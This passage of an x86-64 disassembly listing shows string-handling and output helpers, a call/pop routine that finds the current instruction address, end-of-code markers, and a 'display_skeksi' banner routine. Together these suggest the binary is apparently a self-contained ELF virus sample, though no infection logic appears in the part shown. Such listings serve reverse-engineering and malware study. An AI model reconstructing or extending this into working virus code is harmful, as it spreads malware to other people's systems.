  402aec:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402af0:	48 01 d0             	add    rax,rdx
  402af3:	31 ce                	xor    esi,ecx
  402af5:	89 f2                	mov    edx,esi
  402af7:	88 10                	mov    BYTE PTR [rax],dl
  402af9:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  402afd:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402b00:	89 c2                	mov    edx,eax
  402b02:	c1 ea 1f             	shr    edx,0x1f
  402b05:	01 d0                	add    eax,edx
  402b07:	d1 f8                	sar    eax,1
  402b09:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  402b0c:	0f 8c 36 ff ff ff    	jl     402a48 <itox+0xde>
  402b12:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402b16:	5d                   	pop    rbp
  402b17:	c3                   	ret    

0000000000402b18 <_puts>:
  402b18:	f3 0f 1e fa          	endbr64 
  402b1c:	55                   	push   rbp
  402b1d:	48 89 e5             	mov    rbp,rsp
  402b20:	48 83 ec 10          	sub    rsp,0x10
  402b24:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402b28:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b2c:	48 89 c7             	mov    rdi,rax
  402b2f:	e8 7c 00 00 00       	call   402bb0 <_strlen>
  402b34:	48 89 c2             	mov    rdx,rax
  402b37:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b3b:	48 89 c6             	mov    rsi,rax
  402b3e:	bf 01 00 00 00       	mov    edi,0x1
  402b43:	e8 03 f6 ff ff       	call   40214b <_write>
  402b48:	bf 01 00 00 00       	mov    edi,0x1
  402b4d:	e8 e6 f6 ff ff       	call   402238 <_fsync>
  402b52:	b8 01 00 00 00       	mov    eax,0x1
  402b57:	c9                   	leave  
  402b58:	c3                   	ret    

0000000000402b59 <_puts_nl>:
  402b59:	f3 0f 1e fa          	endbr64 
  402b5d:	55                   	push   rbp
  402b5e:	48 89 e5             	mov    rbp,rsp
  402b61:	48 83 ec 10          	sub    rsp,0x10
  402b65:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402b69:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b6d:	48 89 c7             	mov    rdi,rax
  402b70:	e8 3b 00 00 00       	call   402bb0 <_strlen>
  402b75:	48 89 c2             	mov    rdx,rax
  402b78:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402b7c:	48 89 c6             	mov    rsi,rax
  402b7f:	bf 01 00 00 00       	mov    edi,0x1
  402b84:	e8 c2 f5 ff ff       	call   40214b <_write>
  402b89:	ba 01 00 00 00       	mov    edx,0x1
  402b8e:	48 8d 35 26 03 00 00 	lea    rsi,[rip+0x326]        # 402ebb <display_skeksi+0x13d>
  402b95:	bf 01 00 00 00       	mov    edi,0x1
  402b9a:	e8 ac f5 ff ff       	call   40214b <_write>
  402b9f:	bf 01 00 00 00       	mov    edi,0x1
  402ba4:	e8 8f f6 ff ff       	call   402238 <_fsync>
  402ba9:	b8 01 00 00 00       	mov    eax,0x1
  402bae:	c9                   	leave  
  402baf:	c3                   	ret    

0000000000402bb0 <_strlen>:
  402bb0:	f3 0f 1e fa          	endbr64 
  402bb4:	55                   	push   rbp
  402bb5:	48 89 e5             	mov    rbp,rsp
  402bb8:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402bbc:	48 c7 45 f8 00 00 00 	mov    QWORD PTR [rbp-0x8],0x0
  402bc3:	00 
  402bc4:	eb 05                	jmp    402bcb <_strlen+0x1b>
  402bc6:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402bcb:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  402bcf:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402bd3:	48 01 d0             	add    rax,rdx
  402bd6:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402bd9:	84 c0                	test   al,al
  402bdb:	75 e9                	jne    402bc6 <_strlen+0x16>
  402bdd:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402be1:	5d                   	pop    rbp
  402be2:	c3                   	ret    

0000000000402be3 <_toupper>:
  402be3:	f3 0f 1e fa          	endbr64 
  402be7:	55                   	push   rbp
  402be8:	48 89 e5             	mov    rbp,rsp
  402beb:	89 f8                	mov    eax,edi
  402bed:	88 45 fc             	mov    BYTE PTR [rbp-0x4],al
  402bf0:	80 7d fc 60          	cmp    BYTE PTR [rbp-0x4],0x60
  402bf4:	7e 16                	jle    402c0c <_toupper+0x29>
  402bf6:	80 7d fc 7a          	cmp    BYTE PTR [rbp-0x4],0x7a
  402bfa:	7f 10                	jg     402c0c <_toupper+0x29>
  402bfc:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402c00:	83 e8 20             	sub    eax,0x20
  402c03:	88 45 fc             	mov    BYTE PTR [rbp-0x4],al
  402c06:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402c0a:	eb 04                	jmp    402c10 <_toupper+0x2d>
  402c0c:	0f b6 45 fc          	movzx  eax,BYTE PTR [rbp-0x4]
  402c10:	5d                   	pop    rbp
  402c11:	c3                   	ret    

0000000000402c12 <_strncmp>:
  402c12:	f3 0f 1e fa          	endbr64 
  402c16:	55                   	push   rbp
  402c17:	48 89 e5             	mov    rbp,rsp
  402c1a:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402c1e:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  402c22:	48 89 55 e8          	mov    QWORD PTR [rbp-0x18],rdx
  402c26:	eb 53                	jmp    402c7b <_strncmp+0x69>
  402c28:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c2c:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402c2f:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402c33:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c36:	38 c2                	cmp    dl,al
  402c38:	74 20                	je     402c5a <_strncmp+0x48>
  402c3a:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c3e:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402c41:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402c45:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c48:	38 c2                	cmp    dl,al
  402c4a:	73 07                	jae    402c53 <_strncmp+0x41>
  402c4c:	b8 ff ff ff ff       	mov    eax,0xffffffff
  402c51:	eb 34                	jmp    402c87 <_strncmp+0x75>
  402c53:	b8 01 00 00 00       	mov    eax,0x1
  402c58:	eb 2d                	jmp    402c87 <_strncmp+0x75>
  402c5a:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c5e:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402c61:	84 c0                	test   al,al
  402c63:	75 07                	jne    402c6c <_strncmp+0x5a>
  402c65:	b8 00 00 00 00       	mov    eax,0x0
  402c6a:	eb 1b                	jmp    402c87 <_strncmp+0x75>
  402c6c:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402c71:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  402c76:	48 83 6d e8 01       	sub    QWORD PTR [rbp-0x18],0x1
  402c7b:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  402c80:	75 a6                	jne    402c28 <_strncmp+0x16>
  402c82:	b8 00 00 00 00       	mov    eax,0x0
  402c87:	5d                   	pop    rbp
  402c88:	c3                   	ret    

0000000000402c89 <_strcmp>:
  402c89:	f3 0f 1e fa          	endbr64 
  402c8d:	55                   	push   rbp
  402c8e:	48 89 e5             	mov    rbp,rsp
  402c91:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402c95:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  402c99:	eb 1c                	jmp    402cb7 <_strcmp+0x2e>
  402c9b:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402c9f:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402ca2:	84 c0                	test   al,al
  402ca4:	75 07                	jne    402cad <_strcmp+0x24>
  402ca6:	b8 00 00 00 00       	mov    eax,0x0
  402cab:	eb 3a                	jmp    402ce7 <_strcmp+0x5e>
  402cad:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402cb2:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  402cb7:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402cbb:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402cbe:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402cc2:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402cc5:	38 c2                	cmp    dl,al
  402cc7:	74 d2                	je     402c9b <_strcmp+0x12>
  402cc9:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402ccd:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  402cd0:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402cd4:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402cd7:	38 c2                	cmp    dl,al
  402cd9:	73 07                	jae    402ce2 <_strcmp+0x59>
  402cdb:	b8 ff ff ff ff       	mov    eax,0xffffffff
  402ce0:	eb 05                	jmp    402ce7 <_strcmp+0x5e>
  402ce2:	b8 01 00 00 00       	mov    eax,0x1
  402ce7:	5d                   	pop    rbp
  402ce8:	c3                   	ret    

0000000000402ce9 <_memcmp>:
  402ce9:	f3 0f 1e fa          	endbr64 
  402ced:	55                   	push   rbp
  402cee:	48 89 e5             	mov    rbp,rsp
  402cf1:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402cf5:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402cf9:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402cfc:	eb 35                	jmp    402d33 <_memcmp+0x4a>
  402cfe:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402d02:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402d05:	88 45 ff             	mov    BYTE PTR [rbp-0x1],al
  402d08:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402d0c:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402d0f:	88 45 fe             	mov    BYTE PTR [rbp-0x2],al
  402d12:	0f b6 45 ff          	movzx  eax,BYTE PTR [rbp-0x1]
  402d16:	3a 45 fe             	cmp    al,BYTE PTR [rbp-0x2]
  402d19:	74 0e                	je     402d29 <_memcmp+0x40>
  402d1b:	0f b6 55 ff          	movzx  edx,BYTE PTR [rbp-0x1]
  402d1f:	0f b6 45 fe          	movzx  eax,BYTE PTR [rbp-0x2]
  402d23:	29 c2                	sub    edx,eax
  402d25:	89 d0                	mov    eax,edx
  402d27:	eb 17                	jmp    402d40 <_memcmp+0x57>
  402d29:	48 83 45 e8 01       	add    QWORD PTR [rbp-0x18],0x1
  402d2e:	48 83 45 e0 01       	add    QWORD PTR [rbp-0x20],0x1
  402d33:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  402d36:	8d 50 ff             	lea    edx,[rax-0x1]
  402d39:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402d3c:	85 c0                	test   eax,eax
  402d3e:	75 be                	jne    402cfe <_memcmp+0x15>
  402d40:	5d                   	pop    rbp
  402d41:	c3                   	ret    

0000000000402d42 <get_rip>:
  402d42:	f3 0f 1e fa          	endbr64 
  402d46:	55                   	push   rbp
  402d47:	48 89 e5             	mov    rbp,rsp
  402d4a:	e8 00 00 00 00       	call   402d4f <get_rip_label>

0000000000402d4f <get_rip_label>:
  402d4f:	58                   	pop    rax
  402d50:	48 89 c0             	mov    rax,rax
  402d53:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402d57:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402d5b:	5d                   	pop    rbp
  402d5c:	c3                   	ret    

0000000000402d5d <end_code>:
  402d5d:	f3 0f 1e fa          	endbr64 
  402d61:	55                   	push   rbp
  402d62:	48 89 e5             	mov    rbp,rsp
  402d65:	bf 00 00 00 00       	mov    edi,0x0
  402d6a:	e8 33 f3 ff ff       	call   4020a2 <Exit>
  402d6f:	90                   	nop
  402d70:	5d                   	pop    rbp
  402d71:	c3                   	ret    

0000000000402d72 <dummy_marker>:
  402d72:	f3 0f 1e fa          	endbr64 
  402d76:	55                   	push   rbp
  402d77:	48 89 e5             	mov    rbp,rsp
  402d7a:	90                   	nop
  402d7b:	90                   	nop
  402d7c:	5d                   	pop    rbp
  402d7d:	c3                   	ret    

0000000000402d7e <display_skeksi>:
  402d7e:	f3 0f 1e fa          	endbr64 
  402d82:	55                   	push   rbp
  402d83:	48 89 e5             	mov    rbp,rsp
  402d86:	ba ed 3b 00 00       	mov    edx,0x3bed
  402d8b:	48 c7 c0 c0 2e 40 00 	mov    rax,0x402ec0
  402d92:	48 89 c6             	mov    rsi,rax
  402d95:	bf 01 00 00 00       	mov    edi,0x1
  402d9a:	e8 ac f3 ff ff       	call   40214b <_write>
  402d9f:	90                   	nop
  402da0:	5d                   	pop    rbp
  402da1:	c3                   	ret    
